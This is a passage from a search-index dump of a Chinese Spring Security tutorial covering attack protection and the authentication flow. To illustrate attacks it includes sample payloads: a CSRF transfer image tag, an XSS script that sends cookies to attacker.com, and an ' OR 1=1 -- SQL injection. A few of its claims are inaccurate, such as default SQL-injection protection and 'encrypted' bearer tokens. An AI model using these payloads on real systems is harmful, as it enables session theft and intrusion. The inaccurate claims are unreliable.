\u7684\u6587\u6863\u6ca1\u660e\u786e\u5199\u8fd9\u70b9\u3002\u4e0d\u8fc7\u5927\u90e8\u5206\u4eba\u786e\u5b9e\u6ca1\u6709\u81ea\u5b9a\u4e49\u9a8c\u8bc1\u65b9\u6cd5\u7684\u9700\u6c42\u3002 Spring Security \u5185\u7f6e\u7684 JWT \u662f\u57fa\u4e8e OAuth2 \u8ba4\u8bc1\u6846\u67b6\u7684\uff0c\u6bd4\u8f83\u590d\u6742\uff0c\u5728\u4e0b\u4e00\u90e8\u5206\u4ecb\u7ecd\u3002","title":"Spring Security"},{"location":"14/#spring-ch14-spring-security","text":"Spring \u751f\u6001\u5708\u4e2d\u6709\u4e24\u4e2a\u4e3b\u6d41\u7684\u5b89\u5168\u6846\u67b6\uff1aApache Shiro \u548c Spring Security\u3002Spring Security \u662f Spring \u5b98\u65b9\u7684\u5b89\u5168\u6846\u67b6\uff0c\u5b83\u63d0\u4f9b\u4e86\u4e00\u5957\u5b8c\u6574\u7684\u5b89\u5168\u89e3\u51b3\u65b9\u6848\uff0c\u5305\u62ec\u8ba4\u8bc1\u3001\u6388\u6743\u3001\u653b\u51fb\u9632\u62a4\u7b49\u3002Shiro \u66f4\u4e3a\u8f7b\u91cf\uff0c\u4e5f\u662f\u4e00\u4e2a\u4e0d\u9519\u7684\u9009\u62e9\u3002\u8fd9\u91cc\u6211\u4eec\u53ea\u4ecb\u7ecd Spring Security\u3002 \u8fd9\u91cc\u6211\u4eec\u7684\u6f14\u793a\u4f7f\u7528 Spring WebFlux\u3002\u5728\u8fd9\u91cc\u4f7f\u7528 Reactive \u7248\u7684\u76ee\u7684\u662f\u4e3a\u4e86\u5c55\u793a Spring WebFlux \u7684\u5e94\u7528\uff0c\u4f46\u8fd9\u4e0d\u5f71\u54cd Spring Security \u7684\u5b66\u4e60\u3002","title":"Spring \u901f\u6210 Ch14 Spring Security"},{"location":"14/#spring-security","text":"\u653b\u51fb\u9632\u62a4\uff08Attack Protection\uff09\uff0c\u5305\u62ec\u9632\u6b62\u5e38\u89c1\u7684\u7f51\u7edc\u5b89\u5168\u653b\u51fb\uff0c\u5982 CSRF\u3001XSS\u7b49\u3002 \u8ba4\u8bc1\uff08Authentication\uff09\uff0c\u9a8c\u8bc1\u7528\u6237\u7684\u8eab\u4efd\u3002 \u9274\u6743\uff08Authorization\uff09\uff0c\u63a7\u5236\u7528\u6237\u5bf9\u8d44\u6e90\u7684\u8bbf\u95ee\u6743\u9650\u3002","title":"Spring Security \u4e09\u5927\u804c\u80fd"},{"location":"14/#_1","text":"","title":"\u653b\u51fb\u9632\u62a4"},{"location":"14/#_2","text":"","title":"\u5e38\u89c1\u7684\u7f51\u7edc\u5b89\u5168\u653b\u51fb\u53ca\u5176\u539f\u7406"},{"location":"14/#csrfcross-site-request-forgery","text":"CSRF \u662f\u4e00\u79cd\u7f51\u7edc\u653b\u51fb\uff0c\u653b\u51fb\u8005\u5229\u7528\u7528\u6237\u7684\u767b\u5f55\u72b6\u6001\u53d1\u8d77\u6076\u610f\u8bf7\u6c42\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f2a\u9020\u8bf7\u6c42\uff0c\u8ba9\u7528\u6237\u5728\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\u6267\u884c\u6076\u610f\u64cd\u4f5c\u3002 \u4f8b\u5982\uff0c\u5982\u679c\u7528\u6237\u5728 http://bank.com/transfer \u9875\u9762\u4e0a\u767b\u5f55\u4e86\u94f6\u884c\u8d26\u53f7\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u53e6\u4e00\u4e2a\u9875\u9762\u4e0a\u653e\u7f6e\u4e00\u4e2a <img src=\"http://bank.com/transfer?to=attacker&amount=1000\"> \u7684\u56fe\u7247\uff0c\u5f53\u7528\u6237\u8bbf\u95ee\u8fd9\u4e2a\u9875\u9762\u65f6\uff0c\u6d4f\u89c8\u5668\u4f1a\u81ea\u52a8\u52a0\u8f7d\u8fd9\u4e2a\u56fe\u7247\u3002\u56e0\u4e3a\u7528\u6237\u7684\u7f51\u7edc\u73af\u5883\u4e2d\u5df2\u7ecf\u6709\u4e86\u94f6\u884c\u7684 Cookie\uff0c\u6240\u4ee5\u8fd9\u4e2a\u8bf7\u6c42\u4f1a\u5e26\u4e0a\u7528\u6237\u7684 Cookie\uff0c\u4ece\u800c\u6267\u884c\u4e86\u8f6c\u8d26\u64cd\u4f5c\u3002","title":"CSRF\uff08Cross-Site Request Forgery\uff09"},{"location":"14/#xsscross-site-scripting","text":"XSS \u662f\u4e00\u79cd\u7f51\u7edc\u653b\u51fb\uff0c\u653b\u51fb\u8005\u5728\u7f51\u9875\u4e2d\u6ce8\u5165\u6076\u610f\u811a\u672c\uff0c\u5f53\u7528\u6237\u8bbf\u95ee\u8fd9\u4e2a\u9875\u9762\u65f6\uff0c\u811a\u672c\u4f1a\u5728\u7528\u6237\u7684\u6d4f\u89c8\u5668\u4e2d\u6267\u884c\u3002\u8fd9\u6837\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u83b7\u53d6\u7528\u6237\u7684 Cookie\u3001\u5bc6\u7801\u7b49\u4fe1\u606f\u3002 \u8fd9\u79cd\u653b\u51fb\u5f88\u50cf SQL \u6ce8\u5165\uff0c\u53ea\u4e0d\u8fc7 SQL \u6ce8\u5165\u662f\u653b\u51fb\u6570\u636e\u5e93\uff0c\u800c XSS \u662f\u653b\u51fb\u7528\u6237\u3002 \u4e00\u79cd\u5e38\u89c1\u7684 XSS \u653b\u51fb\u662f\u5728\u8bc4\u8bba\u6846\u4e2d\u6ce8\u5165\u811a\u672c\uff0c\u5f53\u5176\u4ed6\u7528\u6237\u8bbf\u95ee\u8fd9\u4e2a\u9875\u9762\u65f6\uff0c\u811a\u672c\u4f1a\u5728\u4ed6\u4eec\u7684\u6d4f\u89c8\u5668\u4e2d\u6267\u884c\u3002\u4f8b\u5982\uff0c\u653b\u51fb\u8005\u5728\u8bc4\u8bba\u6846\u4e2d\u8f93\u5165 <script>fetch('http://attacker.com?cookie=' + document.cookie)</script> \uff0c\u8fd9\u6837\u5176\u4ed6\u7528\u6237\u8bbf\u95ee\u8fd9\u4e2a\u9875\u9762\u65f6\uff0c\u5c31\u4f1a\u5411 http://attacker.com \u53d1\u9001\u8bf7\u6c42\uff0c\u4ece\u800c\u6cc4\u9732 Cookie\u3002","title":"XSS\uff08Cross-Site Scripting\uff09"},{"location":"14/#sql","text":"SQL \u6ce8\u5165\u662f\u4e00\u79cd\u7f51\u7edc\u653b\u51fb\uff0c\u653b\u51fb\u8005\u5728\u8f93\u5165\u6846\u4e2d\u8f93\u5165\u6076\u610f SQL \u8bed\u53e5\uff0c\u5f53\u8fd9\u4e2a SQL \u8bed\u53e5\u88ab\u62fc\u63a5\u5230\u6570\u636e\u5e93\u67e5\u8be2\u4e2d\u65f6\uff0c\u5c31\u4f1a\u6267\u884c\u8fd9\u4e2a SQL \u8bed\u53e5\u3002 \u4f8b\u5982\uff0c\u5982\u679c\u4e00\u4e2a\u767b\u5f55\u9875\u9762\u7684 SQL \u67e5\u8be2\u662f SELECT * FROM users WHERE username = '${username}' AND password = '${password}' \uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u8f93\u5165 ' OR 1=1 -- \uff0c\u8fd9\u6837 SQL \u67e5\u8be2\u5c31\u53d8\u6210\u4e86 SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = '${password}' \uff0c\u8fd9\u6837\u5c31\u7ed5\u8fc7\u4e86\u5bc6\u7801\u9a8c\u8bc1\u3002","title":"SQL \u6ce8\u5165"},{"location":"14/#_3","text":"\u70b9\u51fb\u52ab\u6301\u662f\u4e00\u79cd\u7f51\u7edc\u653b\u51fb\uff0c\u653b\u51fb\u8005\u5728\u4e00\u4e2a\u900f\u660e\u7684 iframe \u4e2d\u653e\u7f6e\u4e00\u4e2a\u6076\u610f\u7f51\u9875\uff0c\u7136\u540e\u5c06\u8fd9\u4e2a iframe \u653e\u5728\u4e00\u4e2a\u770b\u4f3c\u65e0\u5bb3\u7684\u9875\u9762\u4e0a\u3002\u5f53\u7528\u6237\u70b9\u51fb\u8fd9\u4e2a\u9875\u9762\u65f6\uff0c\u5b9e\u9645\u4e0a\u662f\u70b9\u51fb\u4e86 iframe \u4e2d\u7684\u6076\u610f\u7f51\u9875\u3002 \u4f8b\u5982\uff0c\u653b\u51fb\u8005\u5728\u4e00\u4e2a\u900f\u660e\u7684 iframe \u4e2d\u653e\u7f6e\u4e00\u4e2a\u94f6\u884c\u8f6c\u8d26\u9875\u9762\uff0c\u7136\u540e\u5c06\u8fd9\u4e2a iframe \u653e\u5728\u4e00\u4e2a\u770b\u4f3c\u65e0\u5bb3\u7684\u9875\u9762\u4e0a\u3002\u5f53\u7528\u6237\u70b9\u51fb\u8fd9\u4e2a\u9875\u9762\u65f6\uff0c\u5b9e\u9645\u4e0a\u662f\u70b9\u51fb\u4e86\u94f6\u884c\u8f6c\u8d26\u9875\u9762\uff0c\u4ece\u800c\u6267\u884c\u4e86\u8f6c\u8d26\u64cd\u4f5c\u3002","title":"\u70b9\u51fb\u52ab\u6301"},{"location":"14/#spring-security_1","text":"Spring Security \u4e2d\uff0c\u6240\u6709\u7684\u529f\u80fd\u90fd\u662f\u901a\u8fc7 SecurityFilterChain \u5b9e\u73b0\u7684\u3002\u5982\u540d\u5b57\u6240\u793a\uff0cSecurityFilterChain \u662f\u4e00\u4e2a\u8fc7\u6ee4\u5668\u94fe\uff0c\u5b83\u5305\u542b\u4e86\u4e00\u7cfb\u5217\u7684\u8fc7\u6ee4\u5668\uff0c\u6bcf\u4e2a\u8fc7\u6ee4\u5668\u8d1f\u8d23\u4e00\u4e2a\u529f\u80fd\u3002 \u5bf9\u4e8e Spring Web\uff0c\u8fd9\u4e2a\u8fc7\u6ee4\u5668\u662f Servlet Filter\uff1b\u5bf9\u4e8e Spring WebFlux\uff0c\u8fd9\u4e2a\u8fc7\u6ee4\u5668\u662f WebFilter\u3002\u4e0d\u8fc7\uff0c\u4e24\u8005\u7684\u529f\u80fd\u662f\u4e00\u6837\u7684\u3002 Spring Security \u9ed8\u8ba4\u5f00\u542f\u4e86\u5168\u90e8\u7684\u653b\u51fb\u9632\u62a4\u529f\u80fd\uff0c\u5305\u62ec CSRF\u3001XSS\u3001SQL \u6ce8\u5165\u7b49\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u6765\u5173\u95ed\u8fd9\u4e9b\u529f\u80fd\u3002 @Configuration @EnableWebFluxSecurity public class SecurityConfig { @Bean public SecurityWebFilterChain securityWebFilterChain( ServerHttpSecurity http ) { return http .csrf(csrf -> csrf.disable()) .cors(Customizer.withDefaults()) .build(); } } \u5982\u679c\u662f Servlet \u7248\u672c\uff0c\u4f7f\u7528\uff0c @Configuration @EnableWebSecurity public class SecurityConfig { @Bean public SecurityFilterChain securityFilterChain( HttpSecurity http ) { return http .csrf(csrf -> csrf.disable()) .cors(Customizer.withDefaults()) .build(); } } \u6ce8\u610f\uff0c\u7f51\u4e0a\u7684\u5f88\u591a\u8d44\u6599\u90fd\u7684\u5199\u6cd5\u90fd\u8fc7\u65f6\u4e86\uff0c\u73b0\u5728\u7684\u5199\u6cd5\u53eb lambda DSL\uff0c\u5373 .\u529f\u80fd\u540d(\u53c2\u6570 -> \u53c2\u6570\u8bbe\u7f6e) \u3002\u5982\u679c\u4fdd\u6301\u9ed8\u8ba4\u8bbe\u7f6e\uff0c\u4f7f\u7528 Customizer.withDefaults() \u5373\u53ef\u3002 \u4e0a\u9762\u6bcf\u4e00\u6761\u8bed\u53e5\u90fd\u521b\u5efa\u4e00\u4e2a Filter\uff0c .csrf(csrf -> csrf.disable()) \u5373\u521b\u5efa\u4e86 CsrfWebFilter \uff0c .cors(Customizer.withDefaults()) \u5373\u521b\u5efa\u4e86 CorsWebFilter \u3002\u8fd9\u4e9b Filter \u4f1a\u88ab\u6dfb\u52a0\u5230 SecurityFilterChain \u4e2d\u3002\u6700\u540e\u901a\u8fc7 .build() \u521b\u5efa SecurityFilterChain\u3002 \u8fd9\u4e9b\u653b\u51fb\u7684\u9632\u62a4\u57fa\u672c\u662f\u65e0\u611f\u7684\uff0c\u4e0d\u9700\u8981\u505a\u592a\u591a\u64cd\u4f5c\uff0c\u5747\u9ed8\u8ba4\u5f00\u542f\u3002","title":"\u914d\u7f6e Spring Security \u8fdb\u884c\u653b\u51fb\u9632\u62a4"},{"location":"14/#_4","text":"Spring Security \u63d0\u4f9b\u4e86\u591a\u79cd\u8ba4\u8bc1\u65b9\u5f0f\uff0c\u5305\u62ec\u7528\u6237\u540d\u5bc6\u7801\u8ba4\u8bc1\u3001OAuth2 \u8ba4\u8bc1\u7b49\u3002\u5728\u8fd9\u4e00\u90e8\u5206\uff0c\u6211\u4eec\u53ea\u4ecb\u7ecd\u7528\u6237\u540d\u5bc6\u7801\u8ba4\u8bc1\uff0c\u5e76\u81ea\u5df1\u5b9e\u73b0 JWT \u8ba4\u8bc1\u3002","title":"\u5355\u4f53\u5e94\u7528\u7684\u8ba4\u8bc1\u4e0e\u9274\u6743"},{"location":"14/#_5","text":"\u8ba4\u8bc1\u4fe1\u606f\u7684\u4f20\u9012\u6709\u4e24\u79cd\u65b9\u5f0f\uff1aCookie \u548c Token\u3002 Cookie \u662f\u4e00\u79cd\u5b58\u50a8\u5728\u6d4f\u89c8\u5668\u4e2d\u7684\u4fe1\u606f\uff0c\u5b83\u4f1a\u968f\u7740\u6bcf\u6b21\u8bf7\u6c42\u4e00\u8d77\u53d1\u9001\u5230\u670d\u52a1\u5668\u3002Cookie \u6709\u4e24\u79cd\uff1a\u4f1a\u8bdd Cookie \u548c\u6301\u4e45 Cookie\u3002\u4f1a\u8bdd Cookie \u662f\u4e00\u79cd\u4e34\u65f6 Cookie\uff0c\u5b83\u4f1a\u5728\u6d4f\u89c8\u5668\u5173\u95ed\u65f6\u88ab\u5220\u9664\uff1b\u6301\u4e45 Cookie \u662f\u4e00\u79cd\u957f\u671f Cookie\uff0c\u5b83\u4f1a\u5728\u6d4f\u89c8\u5668\u5173\u95ed\u65f6\u88ab\u4fdd\u5b58\u3002 \u4e0d\u8fc7\uff0c\u73b0\u5728\u7684\u5927\u90e8\u5206\u7684\u8ba4\u8bc1\u4fe1\u606f\u90fd\u662f\u901a\u8fc7 Token \u4f20\u9012\u7684\u3002Token \u662f\u4e00\u79cd\u77ed\u671f\u7684\u8ba4\u8bc1\u4fe1\u606f\uff0c\u5b83\u4f1a\u5728\u4e00\u6bb5\u65f6\u95f4\u540e\u5931\u6548\u3002\u7b80\u5355\u6765\u8bf4\uff0cToken \u5c31\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5b83\u5305\u542b\u4e86\u7528\u6237\u7684\u4fe1\u606f\uff0c\u5982\u7528\u6237\u540d\u3001\u6743\u9650\u7b49\u3002\u4e0e Cookie \u4e0d\u540c\uff0cToken \u662f\u5b58\u50a8\u5728\u5ba2\u6237\u7aef\u7684\uff0c\u5b83\u4f1a\u5728\u6bcf\u6b21\u8bf7\u6c42\u65f6\u88ab\u53d1\u9001\u5230\u670d\u52a1\u5668\uff0c\u5982\u6b64\uff0c\u670d\u52a1\u5668\u5c31\u662f\u65e0\u72b6\u6001\u7684\u3002 Token \u4e00\u822c\u901a\u8fc7 HTTP \u8bf7\u6c42\u5934\u90e8\u7684 Authorization \u5b57\u6bb5\u4f20\u9012\u3002\u5176\u5185\u5bb9\u6839\u636e Token \u7684\u7c7b\u578b\u4e0d\u540c\u800c\u4e0d\u540c\u3002\u4f46\u683c\u5f0f\u90fd\u662f \u683c\u5f0f \u6570\u636e \u4e2d\u95f4\u6709\u4e00\u4e2a\u7a7a\u683c\u3002 \u5e38\u7528\u7684\u683c\u5f0f\u53ea\u6709\u4e24\u79cd\uff0c Basic \u548c Bearer \u3002\u524d\u8005\u53ea\u7528\u4e8e\u7528\u6237\u540d-\u5bc6\u7801\u8ba4\u8bc1\uff0c\u53c8\u79f0\u4e3a HTTP Basic \u8ba4\u8bc1\uff1b\u540e\u8005\u5e7f\u6cdb\u7528\u4e8e\u591a\u79cd\u8ba4\u8bc1\u65b9\u5f0f\uff0c\u79f0\u4e3a Bearer Token \u8ba4\u8bc1\u3002 Basic \u8ba4\u8bc1\u7684\u683c\u5f0f\u662f Basic base64(username:password) \uff0c\u5176\u4e2d base64(username:password) \u662f \u7528\u6237\u540d:\u5bc6\u7801 \u7684 base64 \u7f16\u7801\u3002\u8fd9\u79cd\u8ba4\u8bc1\u65b9\u5f0f\u4e0d\u5b89\u5168\uff0c\u56e0\u4e3a\u7528\u6237\u540d\u548c\u5bc6\u7801\u662f\u660e\u6587\u4f20\u8f93\u7684\u3002 Bearer Token \u8ba4\u8bc1\u7684\u683c\u5f0f\u662f Bearer token \uff0c\u5176\u4e2d token \u662f Token \u7684\u5185\u5bb9\u3002\u8fd9\u79cd\u8ba4\u8bc1\u65b9\u5f0f\u76f8\u5bf9\u5b89\u5168\uff0c\u56e0\u4e3a Token \u662f\u52a0\u5bc6\u7684\u3002Token \u7684\u5177\u4f53\u5185\u5bb9\u53d6\u51b3\u4e8e\u8ba4\u8bc1\u65b9\u5f0f\u3002 \u6b64\u5916\uff0c\u8fd8\u6709\u4e00\u79cd\u8868\u5355\u8ba4\u8bc1\uff0c\u5373\u901a\u8fc7\u8868\u5355\u63d0\u4ea4\u7528\u6237\u540d\u548c\u5bc6\u7801\u3002","title":"\u8ba4\u8bc1\u4fe1\u606f\u7684\u4f20\u9012"},{"location":"14/#spring-security_2","text":"Spring Security \u7684\u6bcf\u4e2a\u9274\u6743\u8bf7\u6c42\u90fd\u662f\u7531 SecurityContext \u5904\u7406\u7684\u3002\u7531\u4e8e\u6bcf\u4e2a HTTP \u8bf7\u6c42\u90fd\u6709\u72ec\u7acb\u7684\u7ebf\u7a0b\u5904\u7406\uff0c\u56e0\u6b64\u5b58\u50a8\u662f\u901a\u8fc7 ThreadLocal \u5b9e\u73b0\u7684\u3002 \u5f53\u524d\u7ebf\u7a0b\u7684 SecurityContext \u901a\u8fc7 SecurityContextHolder.getContext() \u83b7\u53d6\uff0c\u5176\u4e2d\u5305\u542b\u4e86\u5f53\u524d\u7528\u6237\u7684\u4fe1\u606f\u3002\u8fd9\u4e2a\u4fe1\u606f\u662f\u901a\u8fc7 Authentication \u5bf9\u8c61\u8868\u793a\u7684\uff0c\u5176\u4e2d\u5305\u542b\u4e86\u7528\u6237\u7684\u8eab\u4efd\u3001\u51ed\u8bc1\u3001\u6743\u9650\u7b49\u4fe1\u606f\u3002 SecurityContext context = SecurityContextHolder.createEmptyContext(); Authentication authentication = new TestingAuthenticationToken(\"username\", \"password\", \"ROLE_USER\"); context.setAuthentication(authentication); SecurityContextHolder.setContext(context); \u4e0a\u9762\u7684\u4ee3\u7801\u521b\u5efa\u4e86\u4e00\u4e2a SecurityContext \uff0c\u5e76\u8bbe\u7f6e\u4e86\u4e00\u4e2a Authentication \u5bf9\u8c61\u3002\u8fd9\u4e2a Authentication \u5bf9\u8c61\u8868\u793a\u4e86\u4e00\u4e2a\u7528\u6237\uff0c\u5176\u4e2d\u5305\u542b\u4e86\u7528\u6237\u540d\u3001\u5bc6\u7801\u3001\u6743\u9650\u7b49\u4fe1\u606f\u3002 SecurityFilterChain \u8d1f\u8d23\u628a\u7528\u6237\u8bf7\u6c42\u5904\u7406\u6210 Authentication \u5bf9\u8c61\uff0c\u7136\u540e\u628a\u8fd9\u4e2a\u5bf9\u8c61\u5b58\u50a8\u5230 SecurityContext \u4e2d\u3002 Authentication \u5176\u5b9e\u662f\u4e00\u4e2a\u63a5\u53e3\uff0c\u5b9a\u4e49\u5982\u4e0b\uff0c public interface Authentication extends Principal, Serializable { Collection<? extends GrantedAuthority> getAuthorities(); Object getCredentials(); Object getDetails(); Object getPrincipal(); boolean isAuthenticated(); void setAuthenticated(boolean isAuthenticated) throws IllegalArgumentException; } \u5b83\u7531\u56db\u4e2a\u91cd\u8981\u7684\u5c5e\u6027\uff0c Authenticated \uff0c\u662f\u5426\u5df2\u7ecf\u901a\u8fc7\u8ba4\u8bc1\uff1b Principal \uff0c\u7528\u6237\u7684\u8eab\u4efd\uff0c\u5373\u80fd\u8868\u793a\u7528\u6237\u7684\u6807\u8bc6\uff0c\u901a\u5e38\u662f\u7528\u6237\u540d\u6216\u7528\u6237 ID\uff1b Credentials \uff0c\u7528\u6237\u7684\u51ed\u8bc1\uff0c\u5373\u80fd\u9a8c\u8bc1\u7528\u6237\u8eab\u4efd\u7684\u4fe1\u606f\uff0c\u901a\u5e38\u662f\u5bc6\u7801\uff1b Authorities \uff0c\u7528\u6237\u7684\u6743\u9650\uff0c\u5373\u7528\u6237\u80fd\u8bbf\u95ee\u7684\u8d44\u6e90\u3002 Authorities \u662f\u4e00\u4e2a GrantedAuthority \u7684\u96c6\u5408\uff0c GrantedAuthority \u662f\u4e00\u4e2a\u53ea\u6709 getAuthority() \u65b9\u6cd5\u7684\u63a5\u53e3\uff0c\u5b83\u53ea\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u7528\u6237\u7684\u6743\u9650\u3002\u56e0\u6b64\uff0c\u53ef\u4ee5\u8ba4\u4e3a Authorities \u672c\u8d28\u5c31\u662f\u4e00\u4e9b\u5b57\u7b26\u4e32\uff0c\u5b83\u4eec\u53ef\u4ee5\u8868\u793a\u7528\u6237\u7684\u6743\u9650\u3002 \u9ed8\u8ba4\u72b6\u6001\u4e0b\uff0cSecurityFilterChain \u7684\u8ba4\u8bc1\u6d41\u7a0b\u5982\u4e0b\u3002 Filter \u62e6\u622a\u8bf7\u6c42\u3002Filter \u5148\u6839\u636e\u7279\u5b9a\u7684\u89c4\u5219\u628a HTTP \u8bf7\u6c42\u5904\u7406\u6210 Authentication \u5bf9\u8c61\u3002\u8fd9\u65f6\u5bf9\u8c61\u7684 Authenticated \u5c5e\u6027\u4e3a false \u3002Filter \u4f1a\u628a\u8fd9\u4e2a\u5bf9\u8c61\u653e\u5728 SecurityContext \u4e2d\u3002\u8fd9\u4e2a Filter \u662f AuthenticationFilter \u6216 AuthenticationWebFilter \u3002\u5bf9\u4e8e\u524d\u8005\uff0c\u5728\u521b\u5efa\u65f6\u8981\u63d0\u4ea4 AuthenticationManager \u548c\u4e00\u4e2a AuthenticationConverter \uff0c\u5b83\u4eec\u5206\u522b\u8d1f\u8d23\u8ba4\u8bc1\u548c HTTP \u8bf7\u6c42\u8f6c Authentication \u5bf9\u8c61\u3002\u5bf9\u4e8e\u540e\u8005\uff0c\u53ea\u9700\u8981\u63d0\u4ea4 ReactiveAuthenticationManager \uff0cConverter \u53ef\u4ee5\u7528\u56de\u8c03\u51fd\u6570\u8bbe\u7f6e\u3002 Filter \u628a\u7528\u6237\u8ba4\u8bc1\u7684\u4efb\u52a1\u59d4\u6258\u7ed9 AuthenticationManager \u3002 AuthenticationManager \u4f1a\u6839\u636e Authentication \u5bf9\u8c61\u7684 Principal \u548c Credentials \u8fdb\u884c\u8ba4\u8bc1\u3002 authenticate \u662f AuthenticationManager \u7684\u552f\u4e00\u4e00\u4e2a\u65b9\u6cd5\uff0c\u5b83\u63a5\u53d7\u4e00\u4e2a Authentication \u5bf9\u8c61\uff0c\u8fd4\u56de\u4e00\u4e2a\u8ba4\u8bc1\u540e\u7684 Authentication \u5bf9\u8c61\u3002 AuthenticationManager Servlet \u7248\u672c\u7684\u9ed8\u8ba4\u5b9e\u73b0\u662f ProviderManager \uff0c\u5b83\u4f1a\u628a\u8ba4\u8bc1\u4efb\u52a1\u59d4\u6258\u7ed9\u591a\u4e2a AuthenticationProvider \u3002\u6bcf\u4e2a AuthenticationProvider \u8d1f\u8d23\u4e00\u79cd\u8ba4\u8bc1\u65b9\u5f0f\uff0c\u4f8b\u5982\u7528\u6237\u540d\u5bc6\u7801\u8ba4\u8bc1\u3001OAuth2 \u8ba4\u8bc1\u7b49\u3002\u9664\u4e86 authenticated \u65b9\u6cd5\u5916\uff0c AuthenticationProvider \u8fd8\u6709\u4e00\u4e2a supports \u65b9\u6cd5\uff0c\u5b83\u7684\u7b7e\u540d\u662f boolean supports(Class<?> authentication) \uff0c\u7528\u4e8e\u5224\u65ad\u8fd9\u4e2a AuthenticationProvider \u662f\u5426\u652f\u6301\u8fd9\u79cd\u8ba4\u8bc1\u65b9\u5f0f\u3002\u9ed8\u8ba4\u7684 ProviderManager \u4f1a\u904d\u5386\u6240\u6709\u7684 AuthenticationProvider \uff0c\u627e\u5230\u7b2c\u4e00\u4e2a\u652f\u6301\u8fd9\u79cd\u8ba4\u8bc1\u65b9\u5f0f\u7684 AuthenticationProvider \uff0c\u7136\u540e\u8c03\u7528\u5b83\u7684 authenticate \u65b9\u6cd5\u3002\u800c WebFlux \u7248\u672c\u6ca1\u6709 ProviderManager\uff0c\u800c\u662f\u76f4\u63a5\u4f7f\u7528 UserDetailsRepositoryReactiveAuthenticationManager \uff0c\u8fd9\u6bd4 Servlet \u7248\u672c\u5c11\u4e86\u4e00\u5c42\u62bd\u8c61\u3002 AuthenticationProvider \u4f1a\u6839\u636e SecurityContext \u4e2d Authentication \u5bf9\u8c61\u7684 Principal \u548c Credentials \u8fdb\u884c\u8ba4\u8bc1\u3002\u5982\u679c\u8ba4\u8bc1\u6210\u529f\uff0c\u5c31\u8fd4\u56de\u4e00\u4e2a\u8ba4\u8bc1\u540e\u7684 Authentication \u5bf9\u8c61\uff1b\u5982\u679c\u8ba4\u8bc1\u5931\u8d25\uff0c\u5c31\u629b\u51fa\u4e00\u4e2a\u5f02\u5e38\u3002 \u9ed8\u8ba4\u7684 AuthenticationProvider \u662f DaoAuthenticationProvider \uff0c\u5b83\u4f1a\u6839\u636e\u7528\u6237\u540d\u548c\u5bc6\u7801\u4ece\u6570\u636e\u5e93\u4e2d\u67e5\u8be2\u7528\u6237\u4fe1\u606f\u3002\u5b83\u4f9d\u8d56\u4e8e UserDetailsService \uff0c UserDetailsService \u662f\u4e00\u4e2a\u63a5\u53e3\uff0c\u5b83\u53ea\u6709\u4e00\u4e2a\u65b9\u6cd5 UserDetails loadUserByUsername(String username) \uff0c\u7528\u4e8e\u6839\u636e\u7528\u6237\u540d\u67e5\u8be2\u7528\u6237\u4fe1\u606f\u3002 UserDetails \u662f\u4e00\u4e2a\u63a5\u53e3\uff0c\u5b83\u5305\u542b\u4e86\u7528\u6237\u7684\u7528\u6237\u540d\u3001\u5bc6\u7801\u3001\u6743\u9650\u7b49\u4fe1\u606f\u3002 DaoAuthenticationProvider \u4f1a\u6839\u636e UserDetailsService \u67e5\u8be2\u5230\u7684 UserDetails \u5bf9\u8c61\uff0c\u548c Authentication \u5bf9\u8c61\u7684 Credentials \u8fdb\u884c\u6bd4\u8f83\uff0c\u5982\u679c\u76f8\u540c\uff0c\u5c31\u8fd4\u56de\u4e00\u4e2a\u8ba4\u8bc1\u540e\u7684 Authentication \u5bf9\u8c61\uff1b\u5982\u679c\u4e0d\u540c\uff0c\u5c31\u629b\u51fa\u4e00\u4e2a\u5f02\u5e38\u3002\u6b64\u5916\uff0c\u5b83\u8fd8\u6709\u4e00\u4e2a PasswordEncoder \u5c5e\u6027\uff0c\u7528\u4e8e\u5bf9\u5bc6\u7801\u8fdb\u884c\u52a0\u5bc6\u3002 \u8ba4\u8bc1\u6210\u529f\u540e\uff0c AuthenticationManager \u4f1a\u628a\u8ba4\u8bc1\u540e\u7684 Authentication \u5bf9\u8c61\u5b58\u50a8\u5230 SecurityContext \u4e2d\u3002\u8fd9\u65f6\u5bf9\u8c61\u7684 Authenticated \u5c5e\u6027\u4e3a true \u3002 \u540e\u7eed Filter \u6839\u636e Authentication \u5bf9\u8c61\u7684 Authorities \u8fdb\u884c\u9274\u6743\u3002 \u8fd9\u4e2a\u8fc7\u7a0b\u4e00\u5b9a\u8981\u7406\u89e3\u597d\uff0c\u4e0b\u9762\u6211\u4eec\u6240\u6709\u7684\u914d\u7f6e\u90fd\u662f\u57fa\u4e8e\u8fd9\u4e2a\u8fc7\u7a0b\u7684\u3002\u6211\u4eec\u4e00\u822c\u53ea\u4f1a\u6539\u53d8 AuthenticationManager \uff0c UserDetailsService \uff0c PasswordEncoder \u8fd9\u4e09\u4e2a\u7c7b\u3002 \u6ce8\u610f\uff0c\u4e0a\u9762\u7684\u6d41\u7a0b\u662f\u57fa\u4e8e Servlet \u7684\uff0c\u5bf9\u4e8e WebFlux\uff0c\u6d41\u7a0b\u662f\u4e00\u6837\u7684\uff0c\u4f46\u662f Filter \u662f WebFilter\uff0c\u800c\u4e14\u5176\u5b83\u7684\u63a5\u53e3\u540d\u79f0\u90fd\u5728\u5f00\u5934\u6dfb\u52a0\u4e86 Reactive \uff0c\u4f8b\u5982 ReactiveAuthenticationManager \uff0c\u63a5\u53e3\u4ece\u76f4\u63a5\u8fd4\u56de\u503c\u53d8\u6210\u8fd4\u56de Mono \uff0c\u4f46\u662f\u5176\u5b83\u7684\u90fd\u662f\u4e00\u6837\u7684\u3002 \u6b64\u5916\uff0c\u5982\u679c\u627e\u4e0d\u5230 UserDetailsService \uff0c\u5373\u5b8c\u5168\u6ca1\u7ecf\u8fc7 Security \u914d\u7f6e\uff0c\u9ed8\u8ba4\u7684 AuthenticationManager \u903b\u8f91\u662f\u8fd9\u6837\u7684\uff1a\u5b83\u4f1a\u5728\u914d\u7f6e\u6587\u4ef6\u91cc\u627e spring.security.user.name \u548c spring.security.user.password 